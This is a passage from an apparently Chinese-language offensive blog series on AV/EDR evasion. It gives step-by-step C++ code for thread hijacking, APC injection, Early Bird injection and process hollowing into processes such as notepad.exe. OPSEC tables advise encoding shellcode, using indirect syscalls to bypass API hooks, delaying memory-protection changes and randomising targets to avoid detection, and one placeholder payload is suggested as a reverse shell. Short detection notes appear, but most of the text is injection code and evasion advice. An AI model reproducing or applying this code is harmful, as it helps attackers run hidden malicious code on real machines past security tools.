<h4 id="5-恢复线程"><a href="#5-恢复线程" class="headerlink" title="5. 恢复线程"></a><strong>5. 恢复线程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ResumeThread</span>(hThread);<br></code></pre></td></tr></table></figure>

<p>现在线程将在你的Shellcode位置恢复执行。</p>
<hr>
<h3 id="OPSEC考虑因素"><a href="#OPSEC考虑因素" class="headerlink" title="OPSEC考虑因素"></a><strong>OPSEC考虑因素</strong></h3><table>
<thead>
<tr>
<th>方面</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>可检测性</td>
<td>比<code>CreateRemoteThread</code>低，但上下文变化可能会被监控</td>
</tr>
<tr>
<td>内存权限</td>
<td>如果可能，避免使用RWX，使用<code>PAGE_READWRITE</code> → <code>VirtualProtectEx</code></td>
</tr>
<tr>
<td>清理工作</td>
<td>如果需要，稍后恢复线程上下文</td>
</tr>
<tr>
<td>线程选择</td>
<td>选择后台&#x2F;空闲线程以减少崩溃风险</td>
</tr>
<tr>
<td>Shellcode检测</td>
<td>使用编码和运行时解密技术</td>
</tr>
</tbody></table>
<hr>
<h3 id="实际案例-1"><a href="#实际案例-1" class="headerlink" title="实际案例"></a><strong>实际案例</strong></h3><p>此方法在<strong>Cobalt Strike</strong>和<strong>Sliver</strong>等后渗透框架中以隐蔽模式使用。它还被<strong>QakBot</strong>、<strong>Dridex</strong>和一些<strong>Lazarus Group</strong>的恶意软件家族使用，通常用于横向移动或注入系统工具（例如<code>explorer.exe</code>、<code>svchost.exe</code>）。</p>
<hr>
<h3 id="检测与监控"><a href="#检测与监控" class="headerlink" title="检测与监控"></a><strong>检测与监控</strong></h3><table>
<thead>
<tr>
<th>技术</th>
<th>可能的检测方式</th>
</tr>
</thead>
<tbody><tr>
<td>暂停 → 上下文变化</td>
<td>正常应用程序中不常见</td>
</tr>
<tr>
<td>执行权限内存，无图像</td>
<td>Shellcode扫描或YARA规则</td>
</tr>
<tr>
<td>外部线程的<code>SetThreadContext</code>调用</td>
<td>非常规行为</td>
</tr>
</tbody></table>
<p>像<strong>CrowdStrike</strong>、<strong>Defender ATP</strong>和<strong>Sophos Intercept X</strong>这样的EDR，可能会基于行为启发式和API序列来标记这种行为。</p>
<h2 id="AV-EDR规避实用技术-6-4-APC注入（异步过程调用注入）"><a href="#AV-EDR规避实用技术-6-4-APC注入（异步过程调用注入）" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 6.4 - APC注入（异步过程调用注入）"></a>AV&#x2F;EDR规避实用技术 - 6.4 - APC注入（异步过程调用注入）</h2><h3 id="概念概述-2"><a href="#概念概述-2" class="headerlink" title="概念概述"></a><strong>概念概述</strong></h3><p><strong>APC注入</strong>是一种隐蔽的技术，通过将一个函数（通常是Shellcode）排入目标线程的执行上下文中，通常是在线程处于可警觉状态（如等待I&#x2F;O等）时执行。</p>
<p>此方法有两种使用方式：</p>
<ul>
<li><p><strong>本地APC注入</strong>：注入同一进程的线程。</p>
</li>
<li><p><strong>远程APC注入</strong>：注入到另一个进程（目标）的线程，通常用于Shellcode的执行。</p>
</li>
</ul>
<hr>
<h3 id="涉及的Windows-API函数"><a href="#涉及的Windows-API函数" class="headerlink" title="涉及的Windows API函数"></a><strong>涉及的Windows API函数</strong></h3><ul>
<li><p><code>OpenProcess</code></p>
</li>
<li><p><code>OpenThread</code></p>
</li>
<li><p><code>VirtualAllocEx</code></p>
</li>
<li><p><code>WriteProcessMemory</code></p>
</li>
<li><p><code>QueueUserAPC</code></p>
</li>
<li><p><code>NtAlertResumeThread</code> 或 <code>ResumeThread</code></p>
</li>
</ul>
<hr>
<h3 id="关键优势"><a href="#关键优势" class="headerlink" title="关键优势"></a><strong>关键优势</strong></h3><ul>
<li><p>避免创建新线程</p>
</li>
<li><p>比<code>CreateRemoteThread</code>更隐蔽</p>
</li>
<li><p>对于只监控系统调用队列的EDR绕过非常有用</p>
</li>
</ul>
<hr>
<h3 id="完整的C-工作示例"><a href="#完整的C-工作示例" class="headerlink" title="完整的C++工作示例"></a><strong>完整的C++工作示例</strong></h3><p>该示例通过APC注入将Shellcode注入到远程进程（例如<code>notepad.exe</code>）中。</p>
<hr>
<h4 id="1-Shellcode定义（MessageBox-Shellcode）"><a href="#1-Shellcode定义（MessageBox-Shellcode）" class="headerlink" title="1. Shellcode定义（MessageBox Shellcode）"></a><strong>1. Shellcode定义（MessageBox Shellcode）</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] =<br>&#123;<br>    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-comment">// ... NOP滑道或Shellcode字节</span><br>    <span class="hljs-comment">// 用你的实际Shellcode替换</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="2-查找进程ID（工具函数）"><a href="#2-查找进程ID（工具函数）" class="headerlink" title="2. 查找进程ID（工具函数）"></a><strong>2. 查找进程ID（工具函数）</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">DWORD <span class="hljs-title">FindProcessId</span><span class="hljs-params">(<span class="hljs-type">const</span> std::wstring&amp; processName)</span> </span>&#123;<br>    DWORD pid = <span class="hljs-number">0</span>;<br>    HANDLE snap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (snap != INVALID_HANDLE_VALUE) &#123;<br>        PROCESSENTRY32W entry;<br>        entry.dwSize = <span class="hljs-built_in">sizeof</span>(entry);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32FirstW</span>(snap, &amp;entry)) &#123;<br>            <span class="hljs-keyword">do</span> &#123;<br>                <span class="hljs-keyword">if</span> (processName == entry.szExeFile) &#123;<br>                    pid = entry.th32ProcessID;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32NextW</span>(snap, &amp;entry));<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(snap);<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="3-分配内存并写入Shellcode"><a href="#3-分配内存并写入Shellcode" class="headerlink" title="3. 分配内存并写入Shellcode"></a><strong>3. 分配内存并写入Shellcode</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br><br>LPVOID remoteAddr = <span class="hljs-built_in">VirtualAllocEx</span>(<br>    hProcess,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-built_in">sizeof</span>(shellcode),<br>    MEM_COMMIT | MEM_RESERVE,<br>    PAGE_EXECUTE_READWRITE<br>);<br><br><span class="hljs-built_in">WriteProcessMemory</span>(hProcess, remoteAddr, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="4-查找可警觉的线程"><a href="#4-查找可警觉的线程" class="headerlink" title="4. 查找可警觉的线程"></a><strong>4. 查找可警觉的线程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD tid = <span class="hljs-number">0</span>;<br>HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><br>HANDLE snapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (snapshot != INVALID_HANDLE_VALUE) &#123;<br>    THREADENTRY32 threadEntry;<br>    threadEntry.dwSize = <span class="hljs-built_in">sizeof</span>(THREADENTRY32);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Thread32First</span>(snapshot, &amp;threadEntry)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (threadEntry.th32OwnerProcessID == pid) &#123;<br>                tid = threadEntry.th32ThreadID;<br>                hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, FALSE, tid);<br>                <span class="hljs-keyword">if</span> (hThread) <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Thread32Next</span>(snapshot, &amp;threadEntry));<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(snapshot);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="5-排队APC"><a href="#5-排队APC" class="headerlink" title="5. 排队APC"></a><strong>5. 排队APC</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)remoteAddr, hThread, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<p>这将Shellcode排队到线程的APC队列中，等待执行。</p>
<hr>
<h4 id="6-恢复线程并执行"><a href="#6-恢复线程并执行" class="headerlink" title="6. 恢复线程并执行"></a><strong>6. 恢复线程并执行</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ResumeThread</span>(hThread); <span class="hljs-comment">// 或使用NtAlertResumeThread更具隐蔽性</span><br><span class="hljs-built_in">CloseHandle</span>(hThread);<br></code></pre></td></tr></table></figure>

<p>为了执行APC，目标线程<strong>必须处于可警觉状态</strong>（例如<code>SleepEx</code>、<code>WaitForSingleObjectEx</code>等）。</p>
<p>如果线程不处于警觉状态，APC可能会保持排队直到满足条件。</p>
<hr>
<h3 id="实际应用-1"><a href="#实际应用-1" class="headerlink" title="实际应用"></a><strong>实际应用</strong></h3><p>此技术已在恶意软件和后渗透框架中使用，例如：</p>
<ul>
<li><p><strong>Cobalt Strike</strong>：用于注入睡眠信标</p>
</li>
<li><p><strong>Metasploit的Inject Payload</strong>模块</p>
</li>
<li><p><strong>Turla Group恶意软件</strong>：使用<code>QueueUserAPC</code>在本地系统进程上注入</p>
</li>
<li><p><strong>QBot &#x2F; Emotet</strong>：频繁使用APC队列进行绕过检测</p>
</li>
</ul>
<hr>
<h3 id="OPSEC注意事项"><a href="#OPSEC注意事项" class="headerlink" title="OPSEC注意事项"></a><strong>OPSEC注意事项</strong></h3><table>
<thead>
<tr>
<th>考量因素</th>
<th>详细信息</th>
</tr>
</thead>
<tbody><tr>
<td>隐蔽性</td>
<td>高（不创建新线程）</td>
</tr>
<tr>
<td>警觉状态要求</td>
<td>必须目标线程处于正确的状态</td>
</tr>
<tr>
<td>EDR检测</td>
<td>一些EDR会检测到可疑的<code>QueueUserAPC</code>使用</td>
</tr>
<tr>
<td>混淆</td>
<td>编码Shellcode，注入后进行RW → RX转换</td>
</tr>
</tbody></table>
<hr>
<h3 id="EDR检测"><a href="#EDR检测" class="headerlink" title="EDR检测"></a><strong>EDR检测</strong></h3><ul>
<li><p>钩取<code>QueueUserAPC</code>、<code>NtQueueApcThread</code>、<code>NtAlertResumeThread</code></p>
</li>
<li><p>监控无支持的可执行内存段</p>
</li>
<li><p>关联Shellcode注入到可警觉线程</p>
</li>
</ul>
<p>YARA规则和行为分析通常会捕捉无支持的RWX段，因此结合延迟内存保护更为理想。</p>
<h2 id="AV-EDR规避实用技术-6-5-早期注入（Early-Bird-Injection）"><a href="#AV-EDR规避实用技术-6-5-早期注入（Early-Bird-Injection）" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 6.5 - 早期注入（Early Bird Injection）"></a>AV&#x2F;EDR规避实用技术 - 6.5 - 早期注入（Early Bird Injection）</h2><h3 id="概念概述-3"><a href="#概念概述-3" class="headerlink" title="概念概述"></a><strong>概念概述</strong></h3><p><strong>早期注入（Early Bird Injection）</strong>是一种隐蔽的注入技术，利用新创建的暂停进程的<strong>早期执行阶段</strong>。通过在进程正常启动前注入并排队一个有效载荷，可以让恶意软件在安全产品有机会挂钩或检查进程之前执行。</p>
<hr>
<h3 id="关键策略"><a href="#关键策略" class="headerlink" title="关键策略"></a><strong>关键策略</strong></h3><ol>
<li><p>创建一个<strong>暂停的进程</strong>（例如<code>notepad.exe</code>）。</p>
</li>
<li><p>在其地址空间分配内存并注入Shellcode。</p>
</li>
<li><p>使用<code>QueueUserAPC</code>排队Shellcode。</p>
</li>
<li><p>恢复主线程（该线程会在到达入口点之前处理APC）。</p>
</li>
</ol>
<hr>
<h3 id="为什么有效"><a href="#为什么有效" class="headerlink" title="为什么有效"></a><strong>为什么有效</strong></h3><ul>
<li><p>在Shellcode执行时，大多数<strong>EDR还没有完成挂钩</strong>。</p>
</li>
<li><p>该技术在针对<strong>受信任进程</strong>（如LOLbins）时尤其有效，例如<code>notepad.exe</code>、<code>werfault.exe</code>、<code>svchost.exe</code>等。</p>
</li>
</ul>
<hr>
<h3 id="完整工作示例-–-C-早期鸟APC注入"><a href="#完整工作示例-–-C-早期鸟APC注入" class="headerlink" title="完整工作示例 – C++早期鸟APC注入"></a><strong>完整工作示例 – C++早期鸟APC注入</strong></h3><p>此版本创建一个暂停的<code>notepad.exe</code>，通过APC注入Shellcode到其主线程，然后恢复线程。</p>
<hr>
<h4 id="1-定义Shellcode"><a href="#1-定义Shellcode" class="headerlink" title="1. 定义Shellcode"></a><strong>1. 定义Shellcode</strong></h4><p>用你的实际有效载荷替换此部分。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = &#123;<br>    <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-comment">// 示例Shellcode</span><br>    <span class="hljs-comment">// 替换为真实Shellcode</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="2-创建暂停进程"><a href="#2-创建暂停进程" class="headerlink" title="2. 创建暂停进程"></a><strong>2. 创建暂停进程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp">STARTUPINFOA si = &#123; <span class="hljs-built_in">sizeof</span>(si) &#125;;<br>PROCESS_INFORMATION pi;<br><br><span class="hljs-built_in">CreateProcessA</span>(<br>    <span class="hljs-string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    FALSE,<br>    CREATE_SUSPENDED,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    &amp;si,<br>    &amp;pi<br>);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="3-分配内存并写入Shellcode-1"><a href="#3-分配内存并写入Shellcode-1" class="headerlink" title="3. 分配内存并写入Shellcode"></a><strong>3. 分配内存并写入Shellcode</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LPVOID remoteAddr = <span class="hljs-built_in">VirtualAllocEx</span>(<br>    pi.hProcess,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-built_in">sizeof</span>(shellcode),<br>    MEM_COMMIT | MEM_RESERVE,<br>    PAGE_EXECUTE_READWRITE<br>);<br><br><span class="hljs-built_in">WriteProcessMemory</span>(<br>    pi.hProcess,<br>    remoteAddr,<br>    shellcode,<br>    <span class="hljs-built_in">sizeof</span>(shellcode),<br>    <span class="hljs-literal">NULL</span><br>);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="4-在APC队列中排队Shellcode"><a href="#4-在APC队列中排队Shellcode" class="headerlink" title="4. 在APC队列中排队Shellcode"></a><strong>4. 在APC队列中排队Shellcode</strong></h4><p>我们将目标指向<strong>暂停进程的主线程</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">QueueUserAPC</span>(<br>    (PAPCFUNC)remoteAddr,<br>    pi.hThread,<br>    <span class="hljs-literal">NULL</span><br>);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="5-恢复线程-1"><a href="#5-恢复线程-1" class="headerlink" title="5. 恢复线程"></a><strong>5. 恢复线程</strong></h4><p>恢复时，线程会处于<strong>可警觉状态</strong>，并会<strong>执行已排队的APC</strong>，然后继续执行<code>main()</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ResumeThread</span>(pi.hThread);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="6-清理资源"><a href="#6-清理资源" class="headerlink" title="6. 清理资源"></a><strong>6. 清理资源</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br><span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="实际应用示例"><a href="#实际应用示例" class="headerlink" title="实际应用示例"></a><strong>实际应用示例</strong></h3><table>
<thead>
<tr>
<th>恶意软件&#x2F;工具包</th>
<th>早期鸟注入的使用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Cobalt Strike</strong></td>
<td>用于在远程暂停进程中执行Beacon</td>
</tr>
<tr>
<td><strong>FIN7恶意软件</strong></td>
<td>在启动时将Shellcode注入签名的Windows二进制文件中</td>
</tr>
<tr>
<td><strong>QBot</strong></td>
<td>经常执行APC注入作为早期鸟注入的一部分</td>
</tr>
</tbody></table>
<hr>
<h3 id="OPSEC技巧"><a href="#OPSEC技巧" class="headerlink" title="OPSEC技巧"></a><strong>OPSEC技巧</strong></h3><ul>
<li><p>使用<code>VirtualProtectEx</code>在<strong>写入Shellcode后</strong>仅更改内存保护（RW → RX过渡）。</p>
</li>
<li><p>使用<code>NtQueueApcThread</code>直接从ntdll调用，以<strong>绕过API挂钩</strong>。</p>
</li>
<li><p>避免Shellcode中出现可疑字符串或指示符。</p>
</li>
</ul>
<hr>
<h3 id="检测向量"><a href="#检测向量" class="headerlink" title="检测向量"></a><strong>检测向量</strong></h3><table>
<thead>
<tr>
<th>检测方法</th>
<th>绕过技巧</th>
</tr>
</thead>
<tbody><tr>
<td>CreateProcess中的钩子</td>
<td>使用间接系统调用或本地调用</td>
</tr>
<tr>
<td>APC队列关联</td>
<td>随机化进程目标</td>
</tr>
<tr>
<td>内存保护警报</td>
<td>延迟RW → RX过渡</td>
</tr>
</tbody></table>
<hr>
<h3 id="YARA和内存扫描器"><a href="#YARA和内存扫描器" class="headerlink" title="YARA和内存扫描器"></a><strong>YARA和内存扫描器</strong></h3><p>安全产品可能会监控无支持的RWX区域，并检查内存页的熵值。将此技术与<strong>加密+延迟解密</strong>结合使用，可以进一步增强隐蔽性。</p>
<p>更多详情：<a target="_blank" rel="noopener" href="https://github.com/Offensive-Panda/ProcessInjectionTechniques">https://github.com/Offensive-Panda/ProcessInjectionTechniques</a></p>
<h2 id="AV-EDR规避实用技术-6-6-进程空洞化与进程替换"><a href="#AV-EDR规避实用技术-6-6-进程空洞化与进程替换" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 6.6 - 进程空洞化与进程替换"></a>AV&#x2F;EDR规避实用技术 - 6.6 - 进程空洞化与进程替换</h2><h3 id="什么是进程空洞化（Process-Hollowing）？"><a href="#什么是进程空洞化（Process-Hollowing）？" class="headerlink" title="什么是进程空洞化（Process Hollowing）？"></a><strong>什么是进程空洞化（Process Hollowing）？</strong></h3><p><strong>进程空洞化</strong>是一种高级注入技术，过程如下：</p>
<ol>
<li><p>启动一个良性进程，且该进程处于<strong>暂停状态</strong>。</p>
</li>
<li><p>该进程的<strong>代码部分被卸载</strong>（即空洞化）。</p>
</li>
<li><p><strong>恶意负载被注入</strong>到原先的位置。</p>
</li>
<li><p>该进程被<strong>恢复</strong>，在合法应用的幌子下执行攻击者控制的代码。</p>
</li>
</ol>
<hr>
<h3 id="进程替换（Process-Replacement）"><a href="#进程替换（Process-Replacement）" class="headerlink" title="进程替换（Process Replacement）"></a><strong>进程替换（Process Replacement）</strong></h3><p>与空洞化非常相似，但是在<strong>注入Shellcode</strong>时，攻击者将进程内存中的<strong>PE镜像</strong>完全<strong>替换</strong>为另一个完整的可执行文件（EXE）。</p>
<p>这是一种<strong>完全的内存中替换</strong>，包括进程的映像、节（section）映射、头文件、入口点等。</p>
<hr>
<h3 id="为什么有效-1"><a href="#为什么有效-1" class="headerlink" title="为什么有效"></a><strong>为什么有效</strong></h3><ul>
<li><p>杀毒软件&#x2F;EDR工具看到的<strong>是合法的父进程</strong>。</p>
</li>
<li><p>它隐藏了<strong>实际的恶意进程映像</strong>。</p>
</li>
<li><p>有助于绕过<strong>基于命令行的检测</strong>或<strong>父子进程关联</strong>。</p>
</li>
</ul>
<hr>
<h3 id="完整的C-示例-进程空洞化"><a href="#完整的C-示例-进程空洞化" class="headerlink" title="完整的C++示例 - 进程空洞化"></a><strong>完整的C++示例 - 进程空洞化</strong></h3><p>下面是一个简化版的<strong>进程空洞化</strong>实现。</p>
<hr>
<h4 id="1-要注入的Shellcode"><a href="#1-要注入的Shellcode" class="headerlink" title="1. 要注入的Shellcode"></a><strong>1. 要注入的Shellcode</strong></h4><p>用真实的有效载荷替换这部分。例如：MessageBox Shellcode 或者反向Shell。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> payload[] = &#123;<br>    <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xf0</span>,<br>    <span class="hljs-comment">// 替换为实际的Shellcode</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="2-创建暂停进程-1"><a href="#2-创建暂停进程-1" class="headerlink" title="2. 创建暂停进程"></a><strong>2. 创建暂停进程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp">STARTUPINFOA si = &#123; <span class="hljs-built_in">sizeof</span>(si) &#125;;<br>PROCESS_INFORMATION pi;<br><br><span class="hljs-built_in">CreateProcessA</span>(<br>    <span class="hljs-string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    FALSE,<br>    CREATE_SUSPENDED,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    &amp;si,<br>    &amp;pi<br>);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="3-获取远程进程的映像基地址"><a href="#3-获取远程进程的映像基地址" class="headerlink" title="3. 获取远程进程的映像基地址"></a><strong>3. 获取远程进程的映像基地址</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp">PROCESS_BASIC_INFORMATION pbi;<br>ULONG returnLength;<br><br><span class="hljs-built_in">NtQueryInformationProcess</span>(<br>    pi.hProcess,<br>    ProcessBasicInformation,<br>    &amp;pbi,<br>    <span class="hljs-built_in">sizeof</span>(pbi),<br>    &amp;returnLength<br>);<br><br>PVOID pebBaseAddress = pbi.PebBaseAddress;<br><br>PVOID imageBaseAddress = <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">ReadProcessMemory</span>(<br>    pi.hProcess,<br>    (PBYTE)pebBaseAddress + <span class="hljs-number">0x10</span>, <span class="hljs-comment">// PEB中的ImageBaseAddress的偏移</span><br>    &amp;imageBaseAddress,<br>    <span class="hljs-built_in">sizeof</span>(PVOID),<br>    <span class="hljs-literal">NULL</span><br>);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="4-卸载原始映像"><a href="#4-卸载原始映像" class="headerlink" title="4. 卸载原始映像"></a><strong>4. 卸载原始映像</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">NtUnmapViewOfSection</span>(pi.hProcess, imageBaseAddress);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="5-分配内存并写入Payload"><a href="#5-分配内存并写入Payload" class="headerlink" title="5. 分配内存并写入Payload"></a><strong>5. 分配内存并写入Payload</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LPVOID newBase = <span class="hljs-built_in">VirtualAllocEx</span>(<br>    pi.hProcess,<br>    imageBaseAddress,<br>    <span class="hljs-built_in">sizeof</span>(payload),<br>    MEM_COMMIT | MEM_RESERVE,<br>    PAGE_EXECUTE_READWRITE<br>);<br><br><span class="hljs-built_in">WriteProcessMemory</span>(<br>    pi.hProcess,<br>    newBase,<br>    payload,<br>    <span class="hljs-built_in">sizeof</span>(payload),<br>    <span class="hljs-literal">NULL</span><br>);<br></code></pre></td></tr></table></figure>

<hr>
